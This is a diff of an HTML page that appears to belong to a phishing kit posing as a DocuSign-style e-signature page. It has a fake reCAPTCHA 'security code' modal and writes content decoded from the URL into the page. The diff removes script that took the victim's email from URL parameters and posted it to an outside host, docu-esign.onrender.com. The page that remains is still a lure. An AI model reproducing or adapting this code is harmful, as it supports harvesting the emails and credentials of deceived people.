@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -10,13 +11,7 @@
         if (hasStatus) {
             let status = new URLSearchParams(window.location.search).get("status");
             if (status == "true") {
-                let email = new URLSearchParams(window.location.search).get("id");
-                let ref = new URLSearchParams(window.location.search).get("ref");
-                let payLoad = { id: 0, email: email };
-                let emailXhr = new XMLHttpRequest();
-                emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
-                emailXhr.setRequestHeader("Content-type", "application/json");
-                emailXhr.send(JSON.stringify(payLoad));
+
 
                 document.write(
                     decodeURIComponent(
@@ -26,19 +21,15 @@
                     )
                 );
 
-                emailXhr.onreadystatechange = function () {
-                    if (this.readyState == 4 && this.status == 200) {
-                        let response = JSON.parse(this.response);
-                        console.log(response);
-                    }
-                };
+
             }
 
         }
     </script>
 </head>
+
 <body>
-    
+
     <div id="modal" class="w3-modal" style="display: none;">
         <style>
             input:focus {
@@ -64,7 +55,7 @@
         </style>
         <div class="w3-modal-content w3-animate-bottom" style="width: 400px; margin-top: 72px; left: 0px;">
             <div style="padding: 16px 24px; font-family: Arial, Helvetica, sans-serif; position: relative;">
-              <img src="./reCAPTCHA-enterprise.png" alt="" style="width: 40%;">
+                <img src="./reCAPTCHA-enterprise.png" alt="" style="width: 40%;">
                 <p style="text-align: center; font-size: 16px; color: rgba(0, 0, 0, 0.76);">For security reasons, please
                     ensure you enter the code
                     below</p>
@@ -103,4 +94,5 @@
         });
     </script>
 </body>
+
 </html>
